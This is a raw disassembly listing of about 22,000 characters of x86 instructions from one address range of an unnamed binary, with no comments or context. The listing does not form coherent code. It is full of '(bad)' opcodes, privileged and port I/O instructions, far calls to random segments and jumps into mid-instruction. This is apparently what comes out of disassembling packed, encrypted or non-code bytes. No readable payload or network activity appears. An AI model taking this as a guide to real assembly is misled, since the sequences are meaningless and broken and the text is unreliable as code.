  40adfb:	adc    eax,DWORD PTR [eax-0x70]
  40adfe:	xchg   esi,eax
  40adff:	ds (bad) 
  40ae01:	popa   
  40ae02:	jno    0x40ae43
  40ae04:	aam    0x56
  40ae06:	test   BYTE PTR [edi],ch
  40ae08:	mov    BYTE PTR [ebp-0x50],0x62
  40ae0c:	cmp    ebx,DWORD PTR [esi-0x11b3ffad]
  40ae12:	cli    
  40ae13:	mov    BYTE PTR [ebx],bl
  40ae15:	inc    ecx
  40ae16:	cld    
  40ae17:	sbb    dl,ah
  40ae19:	add    ch,BYTE PTR [ebp-0x6c]
  40ae1c:	jle    0x40ae89
  40ae1e:	imul   ecx,DWORD PTR [ecx-0x68fd51c8],0x75cdc45
  40ae28:	mov    bl,0x3d
  40ae2a:	pop    ebx
  40ae2b:	cmc    
  40ae2c:	or     ebx,ebx
  40ae2e:	xchg   ebp,eax
  40ae2f:	jge    0x40ae32
  40ae31:	cwde   
  40ae32:	clc    
  40ae33:	push   cs
  40ae34:	test   edi,0xc37e52b
  40ae3a:	ins    BYTE PTR es:[edi],dx
  40ae3b:	sbb    DWORD PTR [eax-0x198d4946],ebx
  40ae41:	xor    eax,0x4829a4f
  40ae46:	aam    0x9e
  40ae48:	pop    ds
  40ae49:	push   es
  40ae4a:	jge    0x40adeb
  40ae4c:	rol    BYTE PTR [edx+0x59],cl
  40ae4f:	or     ah,bl
  40ae51:	add    BYTE PTR [edi-0x481be1da],ah
  40ae57:	mov    ecx,0x7c2958cf
  40ae5c:	ret    
  40ae5d:	push   esp
  40ae5e:	cli    
  40ae5f:	lods   al,BYTE PTR fs:[esi]
  40ae61:	sbb    ecx,0x9e72860e
  40ae67:	ins    DWORD PTR es:[edi],dx
  40ae68:	xchg   ecx,eax
  40ae69:	loope  0x40aea8
  40ae6b:	sbb    BYTE PTR [bx+0x461a],0x29
  40ae71:	xor    BYTE PTR [edi],ah
  40ae73:	xor    al,0x63
  40ae75:	leave  
  40ae76:	and    ebp,ebp
  40ae78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae79:	enter  0xd970,0xfc
  40ae7d:	dec    edx
  40ae7e:	xchg   ebp,eax
  40ae7f:	ror    BYTE PTR [edx+0x7408208c],0xbf
  40ae86:	xchg   BYTE PTR [edx+0x76],al
  40ae89:	aas    
  40ae8a:	mov    esi,0xa8e1e86b
  40ae8f:	repz push 0x54b99d95
  40ae95:	mov    eax,ds:0xa2429e18
  40ae9a:	jl     0x40aeea
  40ae9c:	mov    dl,bl
  40ae9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9f:	popa   
  40aea0:	sbb    bh,BYTE PTR [ebx]
  40aea2:	add    DWORD PTR [edx],edx
  40aea4:	jnp    0x40aee1
  40aea6:	cmovge esp,DWORD PTR [eax-0x2c]
  40aeaa:	xchg   BYTE PTR [esi],bh
  40aeac:	and    bl,cl
  40aeae:	repnz mov ds:0xc461c156,eax
  40aeb4:	and    eax,0xeca40881
  40aeb9:	sar    BYTE PTR [esi],1
  40aebb:	inc    edx
  40aebc:	add    BYTE PTR [bp+si],0x5e
  40aec0:	mov    ch,0x5
  40aec2:	ja     0x40ae6f
  40aec4:	jmp    DWORD PTR [ecx+eiz*2-0x5d757ec1]
  40aecb:	xchg   edi,eax
  40aecc:	std    
  40aecd:	shld   DWORD PTR [ecx-0x24],ecx,0x93
  40aed2:	inc    ecx
  40aed3:	in     al,dx
  40aed4:	or     ebx,ecx
  40aed6:	mov    ds:0x3336fe7b,al
  40aedb:	inc    edx
  40aedc:	ins    BYTE PTR es:[edi],dx
  40aedd:	inc    ebx
  40aede:	xchg   DWORD PTR [ebx+0x7b],ecx
  40aee1:	xchg   ebp,eax
  40aee2:	pop    esi
  40aee3:	retf   
  40aee4:	inc    ebx
  40aee5:	push   esp
  40aee6:	retf   
  40aee7:	test   eax,0xfe53434
  40aeec:	aad    0xb0
  40aeee:	push   0xcf353f48
  40aef3:	push   esi
  40aef4:	cs (bad) 
  40aef6:	iret   
  40aef7:	(bad)  
  40aef8:	arpl   WORD PTR [ecx],di
  40aefa:	inc    ebp
  40aefb:	fimul  WORD PTR cs:[eax-0x7f]
  40aeff:	sbb    bh,0x95
  40af02:	(bad)  
  40af03:	or     eax,0xfeb371e6
  40af08:	lea    edi,[esp+edi*2+0x4dae940c]
  40af0f:	out    dx,al
  40af10:	lods   eax,DWORD PTR ds:[esi]
  40af11:	jne    0x40af3a
  40af13:	add    eax,0x3ca62a1e
  40af18:	cmp    ch,BYTE PTR [edx-0x57]
  40af1b:	jno    0x40aef8
  40af1d:	jne    0x40af41
  40af1f:	pop    ss
  40af20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af21:	in     eax,dx
  40af22:	xchg   edx,eax
  40af23:	pop    eax
  40af24:	repnz mov esp,0x42af345d
  40af2a:	inc    ecx
  40af2b:	pop    ebx
  40af2c:	adc    al,al
  40af2e:	push   ss
  40af2f:	jno    0x40aebe
  40af31:	loopne 0x40aef1
  40af33:	xor    cl,cl
  40af35:	and    al,0x9f
  40af37:	ficomp WORD PTR [eax-0x60]
  40af3a:	bts    DWORD PTR [edi+0x35d8367],0x1b
  40af42:	adc    ecx,DWORD PTR [edi-0x4f1040b3]
  40af48:	xor    esp,DWORD PTR [esi+edx*8]
  40af4b:	(bad)  
  40af4c:	cld    
  40af4d:	shr    BYTE PTR [ebp+eiz*2+0x40],0xb3
  40af52:	ss pop bx
  40af55:	in     eax,dx
  40af56:	pop    esp
  40af57:	adc    edi,esp
  40af59:	sbb    BYTE PTR [ebx-0x3014f17d],dl
  40af5f:	idiv   DWORD PTR [edi+ebx*1-0x55]
  40af63:	test   BYTE PTR [edx+eiz*4+0x78],0x2d
  40af68:	imul   ebx,DWORD PTR [eax+edi*2+0x48b94316],0x451867b9
  40af73:	ror    eax,1
  40af75:	push   ecx
  40af76:	adc    ecx,DWORD PTR [edi+0x33]
  40af79:	pop    esp
  40af7a:	ror    DWORD PTR [edx+0x680ac29c],1
  40af80:	pop    edi
  40af81:	ins    BYTE PTR es:[edi],dx
  40af82:	cmp    dl,BYTE PTR [eax-0x4d]
  40af85:	jp     0x40af64
  40af87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af88:	(bad)
  40af8b:	mov    bh,0x92
  40af8d:	mov    ss,ebp
  40af8f:	mov    al,ds:0xb5e4964f
  40af94:	mov    dl,0xd3
  40af96:	or     DWORD PTR [esi-0x2736a225],eax
  40af9c:	jecxz  0x40af9c
  40af9e:	xor    al,0x64
  40afa0:	ja     0x40afeb
  40afa2:	aas    
  40afa3:	pop    ecx
  40afa4:	nop
  40afa5:	mov    BYTE PTR [eax-0x61],0xc7
  40afa9:	(bad)  
  40afaa:	jle    0x40af38
  40afac:	pusha  
  40afad:	add    al,0x12
  40afaf:	jmp    0x75e3:0x4f4787b
  40afb6:	nop
  40afb7:	jle    0x40af5f
  40afb9:	nop
  40afba:	pop    ss
  40afbb:	loop   0x40af66
  40afbd:	(bad)  
  40afbe:	scas   eax,DWORD PTR es:[edi]
  40afbf:	ret    
  40afc0:	lock sbb BYTE PTR [eax],0xf7
  40afc4:	dec    ebx
  40afc5:	xchg   esp,eax
  40afc6:	push   ss
  40afc7:	pusha  
  40afc8:	ss mov ch,0x10
  40afcb:	or     DWORD PTR [ebx-0x69],0x797631dd
  40afd2:	popa   
  40afd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd4:	dec    ebp
  40afd5:	fmul   QWORD PTR [eax-0x66]
  40afd8:	fucom  st(5)
  40afda:	inc    edx
  40afdb:	and    ebp,DWORD PTR [esi+0x66]
  40afde:	inc    ebp
  40afdf:	mov    ch,0xd0
  40afe1:	mov    bl,0x7d
  40afe3:	lock jo 0x40afa4
  40afe6:	cmp    esp,0x61
  40afe9:	retf   
  40afea:	fiadd  DWORD PTR [ecx-0x3]
  40afed:	sub    DWORD PTR [edx],edi
  40afef:	cmp    ebx,edi
  40aff1:	pop    edx
  40aff2:	add    eax,0xa3c29d86
  40aff7:	add    bl,dh
  40aff9:	add    al,0x8f
  40affb:	xor    DWORD PTR [edi+eiz*8-0x6e],eax
  40afff:	xor    BYTE PTR [ebx+0x492f76e7],0x12
  40b006:	mov    edi,0x918fb42d
  40b00b:	mov    WORD PTR [edi],gs
  40b00d:	(bad)  
  40b00e:	cmp    esp,DWORD PTR [ebx+0x54500dd5]
  40b014:	or     al,0x4e
  40b016:	bound  edi,QWORD PTR [ebx]
  40b018:	or     BYTE PTR [edi],ah
  40b01a:	loope  0x40b049
  40b01c:	lds    esp,FWORD PTR [ebx+0x3d]
  40b01f:	dec    edi
  40b020:	sub    BYTE PTR [ebx-0x4d],bl
  40b023:	cmove  ebx,DWORD PTR [ecx-0x4aae2723]
  40b02a:	push   edi
  40b02b:	(bad)  
  40b02c:	out    dx,al
  40b02d:	(bad)  
  40b02e:	add    eax,0xfec0e322
  40b033:	mov    al,0x46
  40b035:	sub    al,0x57
  40b037:	push   0xffffffb2
  40b039:	bound  edi,QWORD PTR [ecx-0x5f24d683]
  40b03f:	pop    edx
  40b040:	jg     0x40b046
  40b042:	mov    al,0x3
  40b044:	inc    edi
  40b045:	scas   eax,DWORD PTR es:[edi]
  40b046:	or     bh,BYTE PTR [edi-0x9]
  40b049:	out    dx,al
  40b04a:	xchg   DWORD PTR [ecx+0x5b],edx
  40b04d:	out    dx,al
  40b04e:	cli    
  40b04f:	into   
  40b050:	ins    BYTE PTR es:[edi],dx
  40b051:	sbb    al,0xed
  40b053:	cmp    eax,0x70d718d5
  40b058:	jno    0x40b0ad
  40b05a:	fidivr DWORD PTR [esi]
  40b05c:	cld    
  40b05d:	sbb    al,bl
  40b05f:	scas   eax,DWORD PTR es:[edi]
  40b060:	xor    BYTE PTR [edi+ebp*4+0x6c],dh
  40b064:	ret    0x9db8
  40b067:	ja     0x40aff4
  40b069:	sub    BYTE PTR [eax],0xfd
  40b06c:	test   al,0x8a
  40b06e:	leave  
  40b06f:	popa   
  40b070:	inc    ebp
  40b071:	mov    dh,0x90
  40b073:	dec    eax
  40b074:	fistp  WORD PTR [edx+0x3fedc4de]
  40b07a:	cmp    edi,DWORD PTR [eax]
  40b07c:	mov    cl,0x17
  40b07e:	cdq    
  40b07f:	pop    es
  40b080:	loop   0x40b0a3
  40b082:	pop    es
  40b083:	sub    esi,DWORD PTR [edi+0x2b]
  40b086:	mov    BYTE PTR ds:0x8f613594,bh
  40b08c:	fmul   QWORD PTR [ebx]
  40b08e:	jg     0x40b06f
  40b090:	xor    DWORD PTR [edi+0x5c],eax
  40b093:	sbb    ebx,ebp
  40b095:	inc    esp
  40b096:	sub    DWORD PTR [ecx],eax
  40b098:	aas    
  40b099:	inc    eax
  40b09a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b09b:	enter  0x6aa4,0xf4
  40b09f:	sbb    DWORD PTR gs:[edi-0x3c0f2ee0],ebp
  40b0a6:	aas    
  40b0a7:	sub    bh,BYTE PTR [esi]
  40b0a9:	xchg   ebp,eax
  40b0aa:	jns    0x40b0bb
  40b0ac:	jbe    0x40b12d
  40b0ae:	out    0x6,al
  40b0b0:	(bad)  
  40b0b1:	adc    eax,0x6703b054
  40b0b6:	test   BYTE PTR ss:[esi],0xec
  40b0ba:	loope  0x40b06f
  40b0bc:	mov    dl,0x1f
  40b0be:	jmp    ebp
  40b0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c1:	jp     0x40b12f
  40b0c3:	aaa    
  40b0c4:	pop    edx
  40b0c5:	jl     0x40b0ce
  40b0c7:	ins    DWORD PTR es:[edi],dx
  40b0c8:	push   ds
  40b0c9:	xor    BYTE PTR es:[edx],al
  40b0cc:	inc    BYTE PTR [eax+0x51]
  40b0cf:	sub    bh,BYTE PTR [eax+0x3d410088]
  40b0d5:	jbe    0x40b0c7
  40b0d7:	dec    edi
  40b0d8:	call   0xe6c0d23c
  40b0dd:	in     eax,dx
  40b0de:	add    DWORD PTR ds:0xe373a031,ebx
  40b0e4:	fistp  WORD PTR [edi+0x79b24d80]
  40b0ea:	pop    edi
  40b0eb:	sbb    DWORD PTR [esi-0x664a8f32],0xffffffef
  40b0f2:	sub    DWORD PTR [edx],0xffffff9d
  40b0f5:	xor    BYTE PTR [edx-0x3d33a9c0],cl
  40b0fb:	adc    ebp,ebx
  40b0fd:	fsub   st,st(0)
  40b0ff:	xor    DWORD PTR [edx-0x1],edi
  40b102:	jno    0x40b15b
  40b104:	fsub   QWORD PTR [ecx-0x5a]
  40b107:	adc    BYTE PTR gs:[esp+ecx*1],cl
  40b10b:	and    ah,bh
  40b10d:	or     BYTE PTR [edx],al
  40b10f:	push   ebx
  40b110:	in     al,dx
  40b111:	out    dx,al
  40b112:	xor    cl,BYTE PTR [ebp+0x92edcf]
  40b118:	push   0x35243aab
  40b11d:	aaa    
  40b11e:	add    al,0xf
  40b120:	cmp    edi,ecx
  40b122:	ret    
  40b123:	jle    0x40b0f3
  40b125:	(bad)  ds:0xff2b964a
  40b12b:	or     cl,BYTE PTR [esi+0x42da049c]
  40b131:	cdq    
  40b132:	mov    DWORD PTR [edx+0x63],esp
  40b135:	add    al,0xb6
  40b137:	xor    eax,0xcaa23bdc
  40b13c:	inc    ebx
  40b13d:	and    DWORD PTR [ebx+eax*2-0x29695dae],edi
  40b144:	test   eax,ebx
  40b146:	pop    ecx
  40b147:	pushf  
  40b148:	xor    DWORD PTR [edi],ebx
  40b14a:	repz (bad) 
  40b14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b14d:	sar    BYTE PTR [edi],1
  40b14f:	inc    eax
  40b150:	mov    dl,0xf2
  40b152:	mov    cl,0x9f
  40b154:	sbb    al,BYTE PTR [esi-0xe]
  40b157:	add    DWORD PTR [edi+0xed2f5a0],edx
  40b15d:	and    al,0x8c
  40b15f:	add    eax,DWORD PTR [eax-0x4088cd47]
  40b165:	and    BYTE PTR [edi-0x7abe1926],dl
  40b16b:	shl    BYTE PTR [esi+0x3b],1
  40b16e:	mov    ecx,0xd556e478
  40b173:	ds jmp 0x40b14b
  40b176:	xchg   esi,eax
  40b177:	cmp    eax,0xcd19156f
  40b17c:	les    esi,FWORD PTR [eax]
  40b17e:	lea    edx,[eax+0x3c]
  40b181:	cdq    
  40b182:	stos   BYTE PTR es:[edi],al
  40b183:	ds int3 
  40b185:	mov    al,0x81
  40b187:	inc    eax
  40b188:	ror    BYTE PTR [ebx+0x3935ba70],cl
  40b18e:	inc    edi
  40b18f:	rcl    eax,cl
  40b191:	clc    
  40b192:	sbb    dh,dh
  40b194:	and    al,0x71
  40b196:	xchg   DWORD PTR [edi+eax*8],ebx
  40b199:	pop    eax
  40b19a:	add    DWORD PTR [ebp+0x33],ebx
  40b19d:	push   eax
  40b19e:	lahf   
  40b19f:	xchg   esi,eax
  40b1a0:	pop    ebp
  40b1a1:	xor    al,0xcc
  40b1a3:	or     DWORD PTR [edi+0x3ced2384],ebp
  40b1a9:	cmp    al,0xc8
  40b1ab:	mov    cs,edx
  40b1ad:	in     eax,dx
  40b1ae:	sub    BYTE PTR [ecx],bh
  40b1b0:	sbb    al,0x62
  40b1b2:	mov    bh,0x33
  40b1b4:	inc    cl
  40b1b6:	pop    ecx
  40b1b7:	int    0x8
  40b1b9:	push   edi
  40b1ba:	lea    edi,[ecx-0x68a70f4a]
  40b1c0:	mov    WORD PTR [edi-0x24f4058c],?
  40b1c6:	inc    edi
  40b1c7:	push   esp
  40b1c8:	xchg   DWORD PTR [edx+0x22],ebp
  40b1cb:	inc    ecx
  40b1cc:	pop    ebx
  40b1cd:	xchg   esi,eax
  40b1ce:	mov    ebp,eax
  40b1d0:	test   al,0x88
  40b1d2:	xchg   edi,eax
  40b1d3:	es xchg ecx,eax
  40b1d5:	mov    ebp,edi
  40b1d7:	leave  
  40b1d8:	mov    eax,DWORD PTR [ecx-0x2d]
  40b1db:	xchg   edi,eax
  40b1dc:	or     BYTE PTR [ecx-0x5e],0x79
  40b1e0:	dec    eax
  40b1e1:	mov    dl,al
  40b1e3:	ss and eax,0x43134e3d
  40b1e9:	(bad)  
  40b1eb:	fldcw  WORD PTR [esp+ebx*4]
  40b1ee:	pop    ecx
  40b1ef:	xchg   BYTE PTR [esi-0x67],al
  40b1f2:	sti    
  40b1f3:	sub    BYTE PTR [ebp-0x4e],cl
  40b1f6:	scas   eax,DWORD PTR es:[edi]
  40b1f7:	dec    esp
  40b1f8:	mov    edi,0xd6580b06
  40b1fd:	fwait
  40b1fe:	xchg   ebx,eax
  40b1ff:	add    DWORD PTR [ecx-0x77b4eaa0],ebp
  40b205:	jle    0x40b22f
  40b207:	aas    
  40b208:	dec    ecx
  40b209:	or     al,0xc0
  40b20b:	loop   0x40b1c9
  40b20d:	call   0x9318:0xe831ffcc
  40b214:	push   cs
  40b215:	mov    eax,0x750070be
  40b21a:	rcl    BYTE PTR [ebx],1
  40b21c:	lea    eax,[ecx]
  40b21e:	es rcr cl,1
  40b221:	ss daa 
  40b223:	ret    0x8b6a
  40b226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b227:	fwait
  40b228:	mov    ebx,0x8feb0d52
  40b22d:	jne    0x40b279
  40b22f:	sub    eax,0xcb2305b9
  40b234:	ror    cl,0xfc
  40b237:	stos   BYTE PTR es:[edi],al
  40b238:	icebp  
  40b239:	mov    edi,0xd56168d3
  40b23e:	sbb    edi,DWORD PTR [edx+0x78c44a94]
  40b244:	cld    
  40b245:	aas    
  40b246:	mov    ds:0x79f0de69,al
  40b24b:	imul   BYTE PTR [esi+edi*8-0x39]
  40b24f:	(bad)  
  40b250:	dec    edx
  40b251:	mov    ah,0xe2
  40b253:	mov    ch,0x78
  40b255:	jno    0x40b2c4
  40b257:	adc    bh,ah
  40b259:	lods   al,BYTE PTR ds:[esi]
  40b25a:	xlat   BYTE PTR ds:[ebx]
  40b25b:	out    0x2d,al
  40b25d:	jo     0x40b285
  40b25f:	jo     0x40b2df
  40b261:	mov    esp,0x52c1a57f
  40b266:	sbb    esi,ecx
  40b268:	rcl    DWORD PTR [edi],1
  40b26a:	and    eax,0xdcda1383
  40b26f:	imul   eax,DWORD PTR [ebx+edx*8-0x58f8c840],0x3f
  40b277:	ror    BYTE PTR [esi-0x58],0x4a
  40b27b:	dec    eax
  40b27c:	ret    
  40b27d:	mov    ebp,0xf200ed1
  40b282:	sbb    BYTE PTR [edi],0x79
  40b285:	or     DWORD PTR ds:0xc1b135ab,ebx
  40b28b:	add    al,0x54
  40b28d:	xor    esi,DWORD PTR [ecx+0x1b]
  40b290:	loope  0x40b28c
  40b292:	adc    ebp,DWORD PTR [ebx+0x29047b95]
  40b298:	or     al,0x9
  40b29a:	arpl   WORD PTR [edx+0x7356a36b],bp
  40b2a0:	fnsave [eax]
  40b2a2:	push   ds
  40b2a3:	cmp    dl,bh
  40b2a5:	je     0x40b27a
  40b2a7:	ret    0x6b37
  40b2aa:	mov    ebx,0xe2a09ba2
  40b2af:	arpl   WORD PTR [edi-0x6b19beeb],dx
  40b2b5:	mov    ?,WORD PTR [esi+0x107928d5]
  40b2bb:	dec    eax
  40b2bc:	mov    ecx,0xfa80e529
  40b2c1:	mov    esi,0xdc178b34
  40b2c6:	sbb    ebp,DWORD PTR [edi]
  40b2c8:	popa   
  40b2c9:	mov    ch,0x73
  40b2cb:	push   edi
  40b2cc:	sar    ecx,cl
  40b2ce:	call   0xfd04:0x233b4c6d
  40b2d5:	pop    edi
  40b2d6:	jmp    0x40b2cf
  40b2d8:	pop    ecx
  40b2d9:	xchg   edx,ebp
  40b2db:	xor    al,0x96
  40b2dd:	call   0x1e41e793
  40b2e2:	bound  esp,QWORD PTR [eax]
  40b2e4:	daa    
  40b2e5:	xchg   edi,eax
  40b2e6:	jp     0x40b333
  40b2e8:	out    0x19,al
  40b2ea:	add    esp,eax
  40b2ec:	loope  0x40b36b
  40b2ee:	push   eax
  40b2ef:	aam    0xe3
  40b2f1:	xor    cl,BYTE PTR [eax]
  40b2f3:	aas    
  40b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f5:	add    DWORD PTR [ecx+0x17711780],eax
  40b2fb:	in     al,dx
  40b2fc:	loop   0x40b330
  40b2fe:	inc    ecx
  40b2ff:	dec    esp
  40b300:	hlt    
  40b301:	(bad)
  40b304:	stos   BYTE PTR es:[edi],al
  40b305:	fld    QWORD PTR [ecx+0x6d]
  40b308:	and    BYTE PTR [ebx-0x2],cl
  40b30b:	retf   0xee3b
  40b30e:	popa   
  40b30f:	cmp    BYTE PTR [edx+0x3d],ch
  40b312:	pop    ebx
  40b313:	mov    esp,DWORD PTR [esi+0xe]
  40b316:	add    al,0xda
  40b318:	or     eax,0x8f6f8d6e
  40b31d:	xchg   DWORD PTR [edi+0x119700dc],edi
  40b323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b325:	fmul   DWORD PTR [esi+0x537f93db]
  40b32b:	cmp    DWORD PTR [ebx+edx*2+0x73],esp
  40b32f:	sub    ecx,esi
  40b331:	jnp    0x40b38c
  40b333:	mov    esp,0xd8acd7e
  40b338:	std    
  40b339:	add    al,BYTE PTR [ebx+0x4e]
  40b33c:	retf   
  40b33d:	stos   BYTE PTR es:[edi],al
  40b33e:	pop    esp
  40b33f:	cmp    eax,0x5f9bb34d
  40b344:	int3   
  40b345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b346:	xchg   BYTE PTR ds:[ebx+0x78],al
  40b34a:	popf   
  40b34b:	and    edx,ebx
  40b34d:	push   eax
  40b34e:	rcr    DWORD PTR [edx],cl
  40b350:	cld    
  40b351:	lods   al,BYTE PTR ds:[esi]
  40b352:	call   0xc83a:0xfdbac213
  40b359:	or     esp,edx
  40b35b:	cmp    al,0x18
  40b35d:	mov    dh,0x44
  40b35f:	and    BYTE PTR [esi],al
  40b361:	cld    
  40b362:	lahf   
  40b363:	jp     0x40b2f8
  40b365:	sahf   
  40b366:	ret    
  40b367:	xchg   ecx,eax
  40b368:	cmp    BYTE PTR [ecx+0x58],0x4e
  40b36c:	jae    0x40b30b
  40b36e:	in     eax,0x15
  40b370:	dec    ebx
  40b371:	aaa    
  40b372:	popa   
  40b373:	jmp    0x5fd9bee5
  40b378:	cld    
  40b379:	sbb    eax,0xe66c5e4b
  40b37e:	imul   ebx,ebp,0xffffff82
  40b381:	pop    esi
  40b382:	cli    
  40b383:	popf   
  40b384:	ja     0x40b3d0
  40b386:	mov    bl,BYTE PTR [esi]
  40b388:	arpl   bp,bx
  40b38a:	push   ss
  40b38b:	mov    esi,0x1526aa18
  40b390:	pushf  
  40b391:	retf   
  40b392:	dec    ecx
  40b393:	xor    BYTE PTR [edi-0x29],al
  40b396:	sti    
  40b397:	xor    ah,BYTE PTR [ecx]
  40b399:	rcr    ch,0xee
  40b39c:	call   0x5e91:0xe0487580
  40b3a3:	(bad)  
  40b3a5:	loop   0x40b3b2
  40b3a7:	mov    bl,0x51
  40b3a9:	sub    BYTE PTR [esi+0x55],al
  40b3ac:	fucomp st(4)
  40b3ae:	lock and eax,0x430298e4
  40b3b4:	add    bl,BYTE PTR [ebx]
  40b3b6:	fmul   DWORD PTR [eax]
  40b3b8:	and    bl,BYTE PTR [esi]
  40b3ba:	neg    BYTE PTR [ebx+0x32e40247]
  40b3c0:	mov    eax,0xf87ebfa8
  40b3c5:	mov    WORD PTR [ecx+ebx*2+0x15],gs
  40b3c9:	sbb    eax,0x4711da7c
  40b3ce:	sbb    al,0x8b
  40b3d0:	cmp    BYTE PTR [ebx-0x4a],ch
  40b3d3:	inc    edx
  40b3d4:	rol    BYTE PTR [esi+0x290009af],cl
  40b3da:	push   eax
  40b3db:	sbb    eax,0x526d8a08
  40b3e0:	push   ebp
  40b3e1:	div    DWORD PTR [edi-0x48b7db2e]
  40b3e7:	inc    ecx
  40b3e8:	test   edi,ecx
  40b3ea:	test   al,0xc9
  40b3ec:	lahf   
  40b3ed:	jmp    0x40b3bc
  40b3ef:	mov    bl,BYTE PTR [ecx-0x2ed2c133]
  40b3f5:	ret    
  40b3f6:	arpl   WORD PTR [esi+0x38c0f447],di
  40b3fc:	pop    es
  40b3fd:	mov    edx,0x127d8d08
  40b402:	out    dx,al
  40b403:	push   esi
  40b404:	and    BYTE PTR [edx],ah
  40b406:	push   eax
  40b407:	aas    
  40b408:	test   DWORD PTR [edi+ebx*8-0x3d11da4f],ebp
  40b40f:	dec    esi
  40b410:	sbb    dl,BYTE PTR [edx]
  40b412:	jne    0x40b3e5
  40b414:	add    edx,eax
  40b416:	mov    bh,0xb5
  40b418:	int3   
  40b419:	shl    edi,0x8f
  40b41c:	shl    DWORD PTR [eax],0xb0
  40b41f:	inc    ebx
  40b420:	jns    0x40b492
  40b422:	int3   
  40b423:	scas   al,BYTE PTR es:[edi]
  40b424:	xor    BYTE PTR [edi],dh
  40b426:	xor    al,0x4
  40b428:	jmp    0x55c7a50
  40b42d:	push   edi
  40b42e:	fucomp st(2)
  40b430:	nop
  40b431:	fidivr DWORD PTR [ebp+0x23]
  40b434:	mov    al,0xf
  40b436:	in     al,0x52
  40b438:	inc    eax
  40b439:	mov    edx,0xc1be9057
  40b43e:	loop   0x40b3e4
  40b440:	cmp    al,0x46
  40b442:	adc    eax,0xac46718c
  40b447:	mov    BYTE PTR [edi+0x54c83c94],ch
  40b44d:	cmp    DWORD PTR [edx-0x3326babf],eax
  40b453:	test   esi,0x455ba098
  40b459:	adc    eax,0x78a05c8d
  40b45e:	stos   BYTE PTR es:[edi],al
  40b45f:	call   0x1c8a:0xc3591a2d
  40b466:	es popf 
  40b468:	pop    es
  40b469:	xchg   edx,eax
  40b46a:	and    DWORD PTR [ecx+0x7e93260],esp
  40b470:	std    
  40b471:	push   ebp
  40b472:	pop    ss
  40b473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b474:	cmp    al,0x1a
  40b476:	jle    0x40b47b
  40b478:	shl    BYTE PTR [eax],0xe7
  40b47b:	les    ebx,FWORD PTR [esi]
  40b47d:	add    BYTE PTR [ecx+0xf5dee42],0x80
  40b484:	aam    0xfd
  40b486:	mov    edx,0x17f9b3f3
  40b48b:	es push edi
  40b48d:	xor    BYTE PTR [eax],0x13
  40b490:	and    eax,0xfe4bb4dd
  40b495:	out    dx,eax
  40b496:	inc    edi
  40b497:	mov    eax,0x47406b15
  40b49c:	xchg   edi,eax
  40b49d:	pop    esi
  40b49e:	or     al,0x37
  40b4a0:	cmp    eax,0xbfb2af8d
  40b4a5:	xchg   ebp,eax
  40b4a6:	shl    ah,cl
  40b4a8:	jmp    0x5099bae5
  40b4ad:	dec    edx
  40b4ae:	enter  0x8878,0xc2
  40b4b2:	test   BYTE PTR [eax],bl
  40b4b4:	iret   
  40b4b5:	repnz in al,0xe2
  40b4b8:	outs   dx,DWORD PTR ds:[esi]
  40b4b9:	pop    edi
  40b4ba:	push   ss
  40b4bb:	jg     0x40b50d
  40b4bd:	mov    gs,WORD PTR ds:0x933b2cac
  40b4c3:	xor    eax,0x596412e8
  40b4c8:	mov    edi,0x96837052
  40b4cd:	cmp    eax,0x8dc57854
  40b4d2:	push   ss
  40b4d3:	xor    al,0x94
  40b4d5:	pop    ebp
  40b4d6:	and    BYTE PTR [eax-0x355aba40],ch
  40b4dc:	pusha  
  40b4dd:	push   cs
  40b4de:	xchg   edx,eax
  40b4df:	ja     0x40b4ac
  40b4e1:	or     esi,ecx
  40b4e3:	repz adc BYTE PTR [eax-0x564b644e],cl
  40b4ea:	cmp    DWORD PTR [ebx+0x79],ebx
  40b4ed:	gs cs loope 0x40b489
  40b4f1:	imul   esi,DWORD PTR [eax-0x37915b15],0x46
  40b4f8:	mov    al,ds:0x1cb1693c
  40b4fd:	outs   dx,DWORD PTR ds:[esi]
  40b4fe:	sub    dh,BYTE PTR [ebx-0x12]
  40b501:	dec    ebp
  40b502:	in     eax,0x5c
  40b504:	inc    esp
  40b505:	cmp    ch,al
  40b507:	mov    ch,0x60
  40b509:	mov    cl,0xf3
  40b50c:	stos   DWORD PTR es:[edi],eax
  40b50d:	add    DWORD PTR [esi-0x7c7ca199],esp
  40b513:	mov    eax,ds:0x5cffee6b
  40b518:	jle    0x40b54f
  40b51a:	test   DWORD PTR [eax],edi
  40b51c:	push   ds
  40b51d:	adc    eax,0xa7e38839
  40b522:	js     0x40b4d6
  40b524:	and    eax,DWORD PTR [ecx+0x190d0172]
  40b52a:	aam    0xe
  40b52c:	test   DWORD PTR [eax-0x17],edi
  40b52f:	mov    ds:0x2a148c8b,eax
  40b534:	repnz pushf 
  40b536:	aad    0x4b
  40b538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b539:	xchg   ecx,eax
  40b53a:	mov    cl,0xee
  40b53c:	lods   al,BYTE PTR ds:[esi]
  40b53d:	jmp    0x40b53e
  40b53f:	iret   
  40b540:	std    
  40b541:	pop    edi
  40b542:	sub    BYTE PTR [esi+0x5b],al
  40b545:	mov    edx,0x3d8c4693
  40b54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b54b:	jae    0x40b56a
  40b54d:	sbb    eax,0x15519dc0
  40b552:	cli    
  40b553:	int3   
  40b554:	jmp    0x40b59f
  40b556:	test   DWORD PTR [esp+esi*8+0x1abf44d6],esi
  40b55d:	and    edi,DWORD PTR [ebx+edi*4+0x1eeb3205]
  40b564:	stos   DWORD PTR es:[edi],eax
  40b565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b566:	outs   dx,BYTE PTR ds:[esi]
